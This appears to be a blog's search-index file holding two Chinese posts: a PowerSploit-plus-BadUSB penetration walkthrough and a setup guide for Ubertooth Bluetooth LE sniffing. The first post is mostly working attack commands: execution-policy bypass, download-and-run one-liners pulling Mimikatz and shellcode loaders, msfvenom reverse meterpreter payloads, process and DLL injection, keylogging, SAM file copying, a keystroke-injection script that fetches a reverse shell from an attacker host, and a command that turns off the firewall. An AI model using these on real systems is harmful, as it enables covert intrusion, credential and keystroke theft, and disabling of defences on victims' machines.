<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PowerSploit与Badusb联合进行渗透</title>
    <url>/2018/06/17/IOT/PowerSploit%E4%B8%8EBadusb%E8%81%94%E5%90%88%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h4 id="0x00-PowerShell-介绍"><a href="#0x00-PowerShell-介绍" class="headerlink" title="0x00 PowerShell 介绍"></a>0x00 PowerShell 介绍</h4><p><strong><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111.jpg" alt="img"></strong> </p>
<p>   <strong>Windows PowerShell</strong> <strong>是一种命令行外壳程序和脚本环境，使命令行用户和编写者可以利用，NET Framework的强大功能。</strong></p>
<p>​    <strong>它引入了许多非常有用的新概念，从而进一步扩展了您在Windows命令提示符和Windows Script Host 环境中获得的知识和创建的脚本。</strong></p>
<p>​    <strong>PowerShell诞生于vista时代，在系统中有着强大的功能，可以方便的调用Windows API等等。很多多人忽略了他，但其是一座待开发的金矿，在后渗透测试中产给我们带来意外的惊喜。</strong></p>
<h4 id="0x01-PowerShell执行策略"><a href="#0x01-PowerShell执行策略" class="headerlink" title="0x01 PowerShell执行策略"></a>0x01 PowerShell执行策略</h4><p><strong>输入：get-executionpolicy 查看现用执行策略</strong></p>
<p><strong>Restricted</strong>—默认的设置，不允许任何script</p>
<p><strong>AllSigned</strong>—只能运行经过数字签名的script</p>
<p><strong>RemoteSigned</strong>—运行本地的script不需要数字签名，但是要运行从网络上下载的script就必须要有数字签名。</p>
<p><strong>Unrestricted</strong>—允许所有的script</p>
<p><strong>修改策略：set-executionpolicy [策略名称]</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/222.png" alt="img"></p>
<p><strong>测试：</strong></p>
<p>“$PSVersionTable.PSVersion”写入test.psl 如果脚本成功执行就是打印出这句话</p>
<p>执行：</p>
<p>.\test.ps1 如果是普通用户的话会被禁用</p>
<p><strong>绕过：</strong></p>
<p><strong>powershell.exe –ExecutionPolicy Bypass –file .\test.ps1</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333.png" alt="img"></p>
<p><strong>注意：想要修改执行策略需要超级管理员权限，因此对于内网渗透提权是一个打击。但是可以绕过执行策略限制。</strong></p>
<p><strong>本地权限绕过执行：</strong></p>
<p><strong>Powershell.exe –ExecutionPolicy Bypass –File .\xxx.ps1</strong></p>
<p><strong>本地隐藏权限绕过执行脚本：</strong></p>
<p><strong>PowerShell.exe –ExecutionPolicy Bypass –Nologo –NonInteractive –Noprofile –WindowStyle Hidden –File xxx.ps1</strong></p>
<p><strong>直接用IEX下载远程的PS1脚本回来权限绕过执行：</strong></p>
<p><strong>Powershell “IEX(New-ObjectNet.WebClient).DownloadString(‘<a href="https://is.gd/oeoFul’)”;Invoke-Mimikatz">https://is.gd/oeoFul’)”;Invoke-Mimikatz</a> –dumpCreds”</strong></p>
<h4 id="0x02-PowerSploit"><a href="#0x02-PowerSploit" class="headerlink" title="0x02 PowerSploit"></a>0x02 PowerSploit</h4><p> <strong>Powersploit**</strong>是一款基于powershell的后渗透（Post-exploitation）框架，集成大量渗透相关模块和功能。**</p>
<p><strong>Github**</strong>地址：<strong>[</strong><a href="https://github.com.mattifestation/PowerSploit**](https://github.com.mattifestation/PowerSploit)">https://github.com.mattifestation/PowerSploit**](https://github.com.mattifestation/PowerSploit)</a></p>
<p>将下载下来的powersploit文件夹内的所有文件（不含powersploit文件夹）拷贝到/var/www/html/ 目录下</p>
<h5 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h5><table>
<thead>
<tr>
<th><strong>codexecution</strong></th>
<th>在目标主机执行代码</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ScriptModification</strong></td>
<td>在目标主机上创建或修改脚本</td>
</tr>
<tr>
<td><strong>Persistence</strong></td>
<td>后门脚本（持续性控制）</td>
</tr>
<tr>
<td><strong>AntivirusBypass</strong></td>
<td>发现杀软查杀特征</td>
</tr>
<tr>
<td><strong>Exfiltration</strong></td>
<td>目标主机上的信息收集工具</td>
</tr>
<tr>
<td><strong>Mayhem</strong></td>
<td>蓝屏等破环形脚本</td>
</tr>
<tr>
<td><strong>Recon</strong></td>
<td>以目标主机为跳板进行内网信息侦查</td>
</tr>
</tbody></table>
<h5 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h5><h5 id="1-Invoke-Shellcode"><a href="#1-Invoke-Shellcode" class="headerlink" title="(1)Invoke-Shellcode"></a>(1)Invoke-Shellcode</h5><p><strong>将shellcode插入选择的进程ID或本地PowerShell中</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://IP/CodeExecution/Invoke–Shellcode.ps1”">http://IP/CodeExecution/Invoke–Shellcode.ps1”</a>)</p>
<p><strong>1.攻击者生成payload反弹木马</strong></p>
<p>msfvenom –p windows/meterpreter/reverse_https lhost=192.168.98.94 lport=5555 –f powershell –o /var/www/html/payload</p>
<p><strong>2.监听本机 5555 端口</strong></p>
<p>使用msf exploit/multi/handler模块即可</p>
<p><strong>3.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”">http://192.168.98.94/CodeExecution/Invoke-Shellcode.ps1”</a>)</p>
<p><strong>4.下载反弹木马</strong></p>
<p>(New-Object Net.Webclient).DownloadString(“<a href="http://192.168.98.94/test”">http://192.168.98.94/test”</a>)</p>
<p><strong>5.在powershell下运行</strong></p>
<p>Invoke-Shellcode -Shellcode($buf)</p>
<p><strong>完成以上三个命令得到一个meterpreter后渗透会话</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/444.png" alt="img"></p>
<p><strong>注入进程：</strong></p>
<p><strong>1.使用 PS 或者 Get-Process 来获取当前进程</strong></p>
<p>ps | Get-Process</p>
<p><strong>2.启动一个记事本，并把他设置为隐藏的</strong></p>
<p>Start-Process C:\Windows\system32\notepad.exe –windowStyle Hidden</p>
<p><strong>3.插入进程中,同样反弹成功</strong></p>
<p>Invoke-Shellcode -ProcessID PID -Shellcode($buf) –Force</p>
<h5 id="2-Invoke-DLLinjection-dll注入"><a href="#2-Invoke-DLLinjection-dll注入" class="headerlink" title="(2)Invoke-DLLinjection .dll注入"></a>(2)Invoke-DLLinjection .dll注入</h5><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/CodeExecution/Invoke-DllInjection.ps1”">http://192.168.98.94/CodeExecution/Invoke-DllInjection.ps1”</a>)</p>
<p><strong>2.生成反弹dll文件</strong></p>
<p>2.msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.98.94 lport=5555 -f dll -o /var/www/html/test.dll</p>
<p><strong>3.不可以使用powershell进行下载，之后可以使用badusb进行下载执行</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/test.dll”">http://192.168.98.94/test.dll”</a>)</p>
<p><strong>4.注入进程，切换payload，开始监听，成功反弹</strong></p>
<p>Invoke-DllInjection -ProcessID PID -Dll .\test.dll</p>
<h4 id="3-Invoke-Portscan端口扫描"><a href="#3-Invoke-Portscan端口扫描" class="headerlink" title="(3)Invoke-Portscan端口扫描"></a>(3)Invoke-Portscan端口扫描</h4><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Recon/Invoke-Portscan.ps1”">http://192.168.98.94/Recon/Invoke-Portscan.ps1”</a>)</p>
<p><strong>2.进行端口扫描</strong></p>
<p>Invoke-Portscan -Hosts 192.168.98.95.1,192.168.98.96 -Ports “80,22,3389”</p>
<h5 id="4-Invoke-Mimikatz-Mimikatz"><a href="#4-Invoke-Mimikatz-Mimikatz" class="headerlink" title="(4)Invoke-Mimikatz Mimikatz"></a>(4)Invoke-Mimikatz Mimikatz</h5><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Exfiltration/Invoke-Mimikatz.ps1”">http://192.168.98.94/Exfiltration/Invoke-Mimikatz.ps1”</a>)</p>
<p><strong>2.读取密码（需要管理员权限）</strong></p>
<p>Invoke-Mimikat –DumpCreds</p>
<h5 id="5-Get-Keystrokes-键盘记录"><a href="#5-Get-Keystrokes-键盘记录" class="headerlink" title="(5)Get-Keystrokes 键盘记录"></a>(5)Get-Keystrokes 键盘记录</h5><p><strong>1.下载相应脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Exfiltration/Get-Keystrokes.ps1”">http://192.168.98.94/Exfiltration/Get-Keystrokes.ps1”</a>)</p>
<p><strong>2.键盘记录（记录十分详细，连鼠标点击也可以记录，需要管理员权限）</strong></p>
<p>Get-Keystrokes –LogPath + &lt;保存位置&gt;</p>
<h5 id="6-Invoke-NinjaCopy-文件复制"><a href="#6-Invoke-NinjaCopy-文件复制" class="headerlink" title="(6)Invoke-NinjaCopy 文件复制"></a>(6)Invoke-NinjaCopy 文件复制</h5><p><strong>1.下载相应的脚本</strong></p>
<p>IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.98.94/Exfiltration/Invoke-NinjaCopy.ps1”">http://192.168.98.94/Exfiltration/Invoke-NinjaCopy.ps1”</a>)</p>
<p><strong>2.复制文件（需要管理员权限，一开机就加锁的sam文件也可以复制）</strong></p>
<p>Invoke-NinjaCopy –Path “文件目录”-LocalDestination “复制目录”</p>
<h4 id="0x03-HID-Attack"><a href="#0x03-HID-Attack" class="headerlink" title="0x03 HID Attack"></a>0x03 HID Attack</h4><p><strong>HID**</strong>是Human Interface Device的缩写，例如键盘、鼠标与等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。**</p>
<p>由于电脑对这类设备缺少严格的检测措施，只是简单的识别设备类型，就允许设备对电脑进行各项操作。所以，通过修改篡改设备反馈信息，就可以很轻松的让电脑将其他设备误认为HID设备，从而获取控制权限。尤其是USB和蓝牙这类即插即用接口出现，导致HID Attack成为重要方式。例如，Bad USB就是USB类攻击的典型代表。</p>
<p>通过硬件直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。</p>
<h4 id="0x04-Badusb"><a href="#0x04-Badusb" class="headerlink" title="0x04 Badusb"></a>0x04 Badusb</h4><p>​    <strong>一般来说，USB 设备有两种，一种是 Host，比如电脑，可以去读取其他 USB 设备的数据，另外一种是 Device，比如键盘鼠标优盘。所以从根本上来说，制作一个 Bad USB 核心要求只有一个，就是自身可以作为 USB Device。</strong></p>
<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>
<p> <strong>U盘由芯片控制器和闪存两部分组成，芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</strong></p>
<p>BadUSB就是通过对U盘的固件进行逆向重新编程，相当于改写了U盘的操作系统而进行攻击的。</p>
<p><strong>USB协议漏洞:</strong></p>
<p><strong>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。</strong></p>
<h4 id="0x05-常见的Badusb"><a href="#0x05-常见的Badusb" class="headerlink" title="0x05 常见的Badusb"></a>0x05 常见的Badusb</h4><h5 id="1-hak5的USB-RUBBER-DUCKY"><a href="#1-hak5的USB-RUBBER-DUCKY" class="headerlink" title="1.hak5的USB RUBBER DUCKY"></a>1.hak5的USB RUBBER DUCKY</h5><p><a href="https://hakshop.com/products/usb-rubber-ducky-deluxe">https://hakshop.com/products/usb-rubber-ducky-deluxe</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/555.png" alt="img"></p>
<h5 id="2-Digispark-Attiny85微型-USB接口开发板"><a href="#2-Digispark-Attiny85微型-USB接口开发板" class="headerlink" title="2.Digispark(Attiny85微型) USB接口开发板"></a>2.Digispark(Attiny85微型) USB接口开发板</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1111.png" alt="img">)<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/666.png" alt="img"></p>
<h5 id="3-国内大多是采用的Teensy-或者Arduino-Leonardo，淘宝上还有厂商制作的U盘模样的Arduino-Leonardo"><a href="#3-国内大多是采用的Teensy-或者Arduino-Leonardo，淘宝上还有厂商制作的U盘模样的Arduino-Leonardo" class="headerlink" title="3.国内大多是采用的Teensy 或者Arduino Leonardo，淘宝上还有厂商制作的U盘模样的Arduino Leonardo"></a>3.国内大多是采用的Teensy 或者Arduino Leonardo，淘宝上还有厂商制作的U盘模样的Arduino Leonardo</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/777.png" alt="img"></p>
<h4 id="0x06-Digispark"><a href="#0x06-Digispark" class="headerlink" title="0x06 Digispark"></a>0x06 Digispark</h4><p><strong>Digispark**</strong>是一个基于ATTINY85微控制器的USB开发板，体积小且价钱便宜，功能方面则没有Arduino般强大。代码与Arduino大同小异，更可贵的是使用Arduino IDE来开发。淘宝上直接搜索Digispark就能看到了，价格在7-10元不等。**</p>
<h5 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h5><p><strong>百度云链接：</strong></p>
<p><a href="https://pan.baidu.com/s/1MmbIlSmIL3wGmaRO4RPjTA">https://pan.baidu.com/s/1MmbIlSmIL3wGmaRO4RPjTA</a> <strong>密码:qaqs</strong></p>
<p><strong>Digispark官方教程</strong></p>
<p><a href="http://digistump.com/wiki/digispark/tutorials/connecting">http://digistump.com/wiki/digispark/tutorials/connecting</a></p>
<p><strong>Arduino IDE：</strong></p>
<p><a href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software</a></p>
<p><strong>Digispark的驱动：</strong></p>
<p><a href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip">https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip</a></p>
<p><strong>payload hak5的USB-Rubber-Ducky：</strong></p>
<p><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a></p>
<p><strong>Digispark翻译脚本：</strong></p>
<p><a href="https://github.com/toxydose/Duckyspark">https://github.com/toxydose/Duckyspark</a></p>
<h5 id="1-安装驱动"><a href="#1-安装驱动" class="headerlink" title="1.安装驱动"></a>1.安装驱动</h5><p>Digistump.Drivers目录下</p>
<p>32位系统安装 DPinst.exe</p>
<p>64位系统安装 DPinst64.exe</p>
<p>注意下图提示框的选择：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111.png" alt="img"></p>
<h5 id="2-安装IDE"><a href="#2-安装IDE" class="headerlink" title="2.安装IDE"></a>2.安装IDE</h5><p>解压缩 arduino-1.8.3-windows-IDE.zip</p>
<p>拷贝到C:\Program Files\arduino-1.8.3目录下</p>
<p>运行：arduino.exe</p>
<h5 id="3-设置arduino"><a href="#3-设置arduino" class="headerlink" title="3.设置arduino"></a>3.设置arduino</h5><p><strong>第一步：</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image1.png" alt="img"></p>
<p><strong>第二步：填写附加开发板管理器网址：<a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a></strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image2.png" alt="img"></p>
<p><strong>第三步 打开开发板管理器</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/222-1.png" alt="img"></p>
<p><strong>等待下载完</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333-1.png" alt="img"></p>
<p><strong>然后在“类型”中选择“贡献”</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/444-1.png" alt="img"></p>
<p><strong>点击安装Digistump AVR boards by Digistump</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/666-1.png" alt="img"></p>
<p><strong>等待下载的完成</strong></p>
<p><strong>出现下图时表示安装完成了：</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/777-1.png" alt="img"></p>
<p><strong>工具-开发板- 选择：Digispark(Default -16.5Mhz):-如下图</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/888.png" alt="img"></p>
<p><strong>然后如下图操作</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/999.png" alt="img"></p>
<p><strong>项目-加载库-添加一个.zip库……（此处无法截图）</strong></p>
<p><strong>然后将Keyboard.zip载入</strong></p>
<h4 id="0x07-HID-Attack-测试"><a href="#0x07-HID-Attack-测试" class="headerlink" title="0x07 HID Attack 测试"></a>0x07 HID Attack 测试</h4><h5 id="1-使用hak5-USB-RUBBER-DUCKY-payload进行测试"><a href="#1-使用hak5-USB-RUBBER-DUCKY-payload进行测试" class="headerlink" title="1.使用hak5-USB RUBBER DUCKY payload进行测试"></a>1.使用hak5-USB RUBBER DUCKY payload进行测试</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/ccc.png" alt="img"></p>
<h4 id="2-使用PowerSploit进行联合测试"><a href="#2-使用PowerSploit进行联合测试" class="headerlink" title="2.使用PowerSploit进行联合测试"></a>2.使用PowerSploit进行联合测试</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111111.jpg" alt="img"></p>
<h6 id="1-创建一个test-txt文件，内容如下："><a href="#1-创建一个test-txt文件，内容如下：" class="headerlink" title="1.创建一个test.txt文件，内容如下："></a>1.创建一个test.txt文件，内容如下：</h6><p>DELAY 5000GUI rDELAY 500STRING cmd.exe /T:01 /K mode CON: COLS=16 LINES=1DELAY 400ENTERDELAY 500ENTERDELAY 400STRING powershellDELAY 500ENTERDELAY 500STRING IEX(New-Object Net.Webclient).DownloadString(“<a href="http://192.168.99.135/CodeExecution/Invoke-Shellcode.ps1”)//地址是kali的DELAY">http://192.168.99.135/CodeExecution/Invoke-Shellcode.ps1”)//地址是kali的DELAY</a> 500ENTERDELAY 500STRING IEX (New-Object Net.Webclient).DownloadString(“<a href="http://192.168.99.135/xpy”)DELAY">http://192.168.99.135/xpy”)DELAY</a> 500ENTERDELAY 500STRING Invoke-Shellcode -Shellcode ($buf)DELAY 500ENTERDELAY 2000ENTERDELAY 5000</p>
<h5 id="2-运行payload转化脚本"><a href="#2-运行payload转化脚本" class="headerlink" title="2.运行payload转化脚本"></a>2.运行payload转化脚本</h5><p>python Duckyspark_translator.py e:\test1.txt e:\powershell</p>
<h5 id="3-打开-生成的powershell-ino-文件将其内容拷贝到arduino-中编译"><a href="#3-打开-生成的powershell-ino-文件将其内容拷贝到arduino-中编译" class="headerlink" title="3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译"></a>3.打开 生成的powershell.ino 文件将其内容拷贝到arduino 中编译</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/333.jpg" alt="img"></p>
<h5 id="4-当编译没有错误时-插入badusb-然后点击“上传”（如下图）"><a href="#4-当编译没有错误时-插入badusb-然后点击“上传”（如下图）" class="headerlink" title="4.当编译没有错误时 插入badusb 然后点击“上传”（如下图）"></a>4.当编译没有错误时 插入badusb 然后点击“上传”（如下图）</h5><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/2222.jpg" alt="img"></p>
<h5 id="5-监听相应端口"><a href="#5-监听相应端口" class="headerlink" title="5.监听相应端口"></a>5.监听相应端口</h5><p>msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost 192.168.99.135 set lport 5555 run</p>
<h5 id="6-msfvenom生成一个powershell脚本："><a href="#6-msfvenom生成一个powershell脚本：" class="headerlink" title="6.msfvenom生成一个powershell脚本："></a>6.msfvenom生成一个powershell脚本：</h5><p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.135 LPORT=5555 -f powershell -o /var/www/html/test</p>
<h5 id="7-然后主机插入badusb-反弹成功"><a href="#7-然后主机插入badusb-反弹成功" class="headerlink" title="7.然后主机插入badusb 反弹成功"></a>7.然后主机插入badusb 反弹成功</h5><h4 id="3-使用自己搭建的ftp等互联网服务进行渗透"><a href="#3-使用自己搭建的ftp等互联网服务进行渗透" class="headerlink" title="3.使用自己搭建的ftp等互联网服务进行渗透"></a>3.使用自己搭建的ftp等互联网服务进行渗透</h4><h5 id="（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。"><a href="#（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。" class="headerlink" title="（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。"></a>（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。</h5><p>注1：如果用户防火墙开着在下载文件的时候会弹出提示，这样操作就会失败。</p>
<p>注2：如果用户装了安全软件如360这种，关闭防火墙的时候会有告警弹出，也会失败。</p>
<p>cd %USERPROFILE%</p>
<p>netsh firewall set opmode mode=disable profile =ALL</p>
<h5 id="（2）通过执行ftp命令txt文件进行利用"><a href="#（2）通过执行ftp命令txt文件进行利用" class="headerlink" title="（2）通过执行ftp命令txt文件进行利用"></a><strong>（2）通过执行ftp命令txt文件进行利用</strong></h5><p><strong>ftp -s:ftp.txt</strong></p>
<h4 id="4-利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透"><a href="#4-利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透" class="headerlink" title="4. 利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透"></a>4. 利用其他小工具、更加复杂的命令等你可以想到的骚思路来进行渗透</h4><h4 id="1-tv-dump-exe-获取teamviewer用户名密码"><a href="#1-tv-dump-exe-获取teamviewer用户名密码" class="headerlink" title="1.tv_dump.exe 获取teamviewer用户名密码"></a>1.tv_dump.exe 获取teamviewer用户名密码</h4><h4 id="2-mimikatz-WebBrowserPassView-等"><a href="#2-mimikatz-WebBrowserPassView-等" class="headerlink" title="2.mimikatz | WebBrowserPassView 等"></a>2.mimikatz | WebBrowserPassView 等</h4><h4 id="3-包括一些ukey接口以及终端服务机器等"><a href="#3-包括一些ukey接口以及终端服务机器等" class="headerlink" title="3.包括一些ukey接口以及终端服务机器等"></a>3.包括一些ukey接口以及终端服务机器等</h4><p><strong>ps：</strong></p>
<p>1.win7的补丁可能破坏了powershell，导致崩溃，若崩溃，就将tcp协议换为http协议，再进行回连。</p>
<p>2.注意回连不成功，可能是没有打开apache服务器，没开SSH。</p>
<p>3.用Arduino打开时，一个文件夹下只能有一个ino文件，否则编译时会出错。</p>
<p>4.用python 3.多的版本运行脚本</p>
<p>5.在该脚本路径下敲cmd运行脚本</p>
<p>6.txt放在c盘之外再编译成powershell脚本</p>
<p>7.编译时去掉注释</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>BadUsb</tag>
        <tag>PowerSploit</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Ubertooth one扫描嗅探低功耗蓝牙</title>
    <url>/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/</url>
    <content><![CDATA[<h2 id="0x00-本机环境"><a href="#0x00-本机环境" class="headerlink" title="0x00 本机环境"></a>0x00 本机环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac osx 10.15.5</span><br><span class="line">VMware Fusion 11.5.1</span><br><span class="line">Ubuntu 18.04</span><br><span class="line">Ubertooth One</span><br></pre></td></tr></table></figure>



<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><h3 id="1-安装lib库"><a href="#1-安装lib库" class="headerlink" title="1. 安装lib库"></a>1. 安装lib库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-software-properties</span><br><span class="line">add-apt-repository ppa:pyside</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install libnl-3-dev libusb-1.0-0-dev pyside-tools</span><br></pre></td></tr></table></figure>

<h3 id="2-安装libbtbb"><a href="#2-安装libbtbb" class="headerlink" title="2. 安装libbtbb"></a>2. 安装libbtbb</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;greatscottgadgets&#x2F;libbtbb&#x2F;archive&#x2F;2015-09-R2.tar.gz -O libbtbb-2015-09-R2.tar.gz</span><br><span class="line">tar xf libbtbb-2015-09-R2.tar.gz</span><br><span class="line">cd libbtbb-2015-09-R2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h3 id="3-安装ubertooth"><a href="#3-安装ubertooth" class="headerlink" title="3. 安装ubertooth"></a>3. 安装ubertooth</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ubertooth</span><br></pre></td></tr></table></figure>

<blockquote>
<p>报错安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="4-安装wireshark"><a href="#4-安装wireshark" class="headerlink" title="4. 安装wireshark"></a>4. 安装wireshark</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install wireshark</span><br></pre></td></tr></table></figure>

<h3 id="5-安装kismet"><a href="#5-安装kismet" class="headerlink" title="5. 安装kismet"></a>5. 安装kismet</h3><h4 id="a-直接安装"><a href="#a-直接安装" class="headerlink" title="a. 直接安装"></a>a. 直接安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ckermit </span><br></pre></td></tr></table></figure>

<p>在~中创建.kermrc，然后输入如下配置信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set line          &#x2F;dev&#x2F;ttyUSB0  </span><br><span class="line">set speed         115200  </span><br><span class="line">set carrier-watch off  </span><br><span class="line">set handshake     none  </span><br><span class="line">set flow-control none  </span><br><span class="line">robust  </span><br><span class="line">set file type     bin  </span><br><span class="line">set file name     lit  </span><br><span class="line">set rec pack      1000  </span><br><span class="line">set send pack     1000  </span><br><span class="line">set window        5  </span><br></pre></td></tr></table></figure>



<h4 id="b-编译安装"><a href="#b-编译安装" class="headerlink" title="b. 编译安装"></a>b. 编译安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;kismetwireless.net&#x2F;code&#x2F;kismet-2020-09-R1.tar.xz</span><br><span class="line">tar xf kismet-2020-09-R1.tar.xz</span><br><span class="line">cd kismet-2020-09-R1</span><br><span class="line">ln -s ..&#x2F;ubertooth-2015-09-R2&#x2F;host&#x2F;kismet&#x2F;plugin-ubertooth .</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp;&amp; make plugins</span><br><span class="line">sudo make suidinstall</span><br><span class="line">sudo make plugins-install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>报错安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ncurses-dev</span><br><span class="line">sudo apt-get install libpcap-dev</span><br><span class="line">sudo apt-get install libz-dev</span><br><span class="line">sudo apt-get install libmicrohttpd-dev</span><br><span class="line">sudo apt-get install libsqlite3-dev</span><br></pre></td></tr></table></figure>


</blockquote>
<p>找到kismet的配置文件kismet.conf ，把”pcapbtbb”加入到kismet.conf的logtypes= 里边</p>
<h3 id="6-安装BLE解密工具crackle"><a href="#6-安装BLE解密工具crackle" class="headerlink" title="6. 安装BLE解密工具crackle"></a>6. 安装BLE解密工具crackle</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mikeryan&#x2F;crackle.git</span><br><span class="line">cd crackle</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h2 id="0x02-嗅探扫描"><a href="#0x02-嗅探扫描" class="headerlink" title="0x02 嗅探扫描"></a>0x02 嗅探扫描</h2><h3 id="1-Spectool"><a href="#1-Spectool" class="headerlink" title="1. Spectool"></a>1. Spectool</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install spectools</span><br></pre></td></tr></table></figure>

<h4 id="a-spectool-curses"><a href="#a-spectool-curses" class="headerlink" title="a. spectool_curses"></a>a. spectool_curses</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015092657632.png" alt="image-20201015092657632"></p>
<h4 id="b-spectool-gtk"><a href="#b-spectool-gtk" class="headerlink" title="b. spectool_gtk"></a>b. spectool_gtk</h4><p>扫描附近信号在频谱上显示</p>
